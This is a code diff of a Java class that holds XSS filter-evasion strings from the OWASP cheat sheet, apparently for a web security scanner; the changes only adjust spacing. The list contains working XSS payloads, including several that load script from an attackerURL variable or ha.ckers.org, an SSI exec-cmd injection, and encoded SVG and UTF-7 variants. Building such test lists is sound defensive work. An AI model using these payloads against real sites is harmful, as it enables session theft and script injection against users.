@@ -32,7 +32,7 @@ public class XSSBasicInputStrings extends StringContainer {
 		//TODO: maybe make the hardcoded javascript function call (mostly alert) dynamic?
 		//Strings are taken from https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 		add("'';!--\"<XSS>=&{()}");
-		add("<SCRIPT SRC="+attackerURL+"></SCRIPT>");
+		add("<SCRIPT SRC=" + attackerURL + "></SCRIPT>");
 		add("<IMG SRC=\"javascript:alert('XSS');\">");
 		add("<IMG SRC=javascript:alert('XSS')>");
 		add("<IMG SRC=JaVaScRiPt:alert('XSS')>");
@@ -54,16 +54,16 @@ public class XSSBasicInputStrings extends StringContainer {
 		add("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">");
 		add("perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out");
 		add("<IMG SRC=\" &#14;  javascript:alert('XSS');\">");
-		add("<SCRIPT/XSS SRC=\""+attackerURL+"\"></SCRIPT>");
+		add("<SCRIPT/XSS SRC=\"" + attackerURL + "\"></SCRIPT>");
 		add("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>");
-		add("<SCRIPT/SRC=\""+attackerURL+"\"></SCRIPT>");
+		add("<SCRIPT/SRC=\"" + attackerURL + "\"></SCRIPT>");
 		add("<<SCRIPT>alert(\"XSS\");//<</SCRIPT>");
-		add("<SCRIPT SRC="+attackerURL+"?< B >");
+		add("<SCRIPT SRC=" + attackerURL + "?< B >");
 		//TODO: externer http link? .j gehört dazu?
 		add("<SCRIPT SRC=//ha.ckers.org/.j>");
 		add("<IMG SRC=\"javascript:alert('XSS')\"");
 		//TODO: externer http link?
-		add("<iframe src="+attackerURL+" <");
+		add("<iframe src=" + attackerURL + " <");
 		add("\\\";alert('XSS');//");
 		add("</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>");
 		add("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">");
@@ -102,19 +102,19 @@ public class XSSBasicInputStrings extends StringContainer {
 		add("<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">");
 		add("<BASE HREF=\"javascript:alert('XSS');//\">");
 		add("<BASE HREF=\"javascript:alert('XSS');/\">");
-		add("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\""+attackerURL+"\"></OBJECT>");
+		add("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"" + attackerURL + "\"></OBJECT>");
 		add("<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>");
-		add("<SCRIPT SRC=\""+attackerURL+"\"></SCRIPT>");
-		add("<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC="+attackerURL+"></SCRIPT>'\"-->");
+		add("<SCRIPT SRC=\"" + attackerURL + "\"></SCRIPT>");
+		add("<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=" + attackerURL + "></SCRIPT>'\"-->");
 		add("<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">");
 		add(" <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-");
-		add("<SCRIPT a=\">\" SRC=\""+attackerURL+"\"></SCRIPT>");
-		add("<SCRIPT =\">\" SRC=\""+attackerURL+"\"></SCRIPT>");
-		add("<SCRIPT a=\">\" '' SRC=\""+attackerURL+"\"></SCRIPT>");
-		add("<SCRIPT \"a='>'\" SRC=\""+attackerURL+"\"></SCRIPT>");
-		add("<SCRIPT a=`>` SRC=\""+attackerURL+"\"></SCRIPT>");
-		add("<SCRIPT a=\">'>\" SRC=\""+attackerURL+"\"></SCRIPT>");
-		add("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\""+attackerURL+"\"></SCRIPT>");		
+		add("<SCRIPT a=\">\" SRC=\"" + attackerURL + "\"></SCRIPT>");
+		add("<SCRIPT =\">\" SRC=\"" + attackerURL + "\"></SCRIPT>");
+		add("<SCRIPT a=\">\" '' SRC=\"" + attackerURL + "\"></SCRIPT>");
+		add("<SCRIPT \"a='>'\" SRC=\"" + attackerURL + "\"></SCRIPT>");
+		add("<SCRIPT a=`>` SRC=\"" + attackerURL + "\"></SCRIPT>");
+		add("<SCRIPT a=\">'>\" SRC=\"" + attackerURL + "\"></SCRIPT>");
+		add("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"" + attackerURL + "\"></SCRIPT>");		
 		//Next one was multiple lines but it is probably irrelevant
 		add("<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\"></BODY></HTML>");
 		//Next Strings are from http://airodump.net/xss-pentest-plugin-cross-site-scripting/
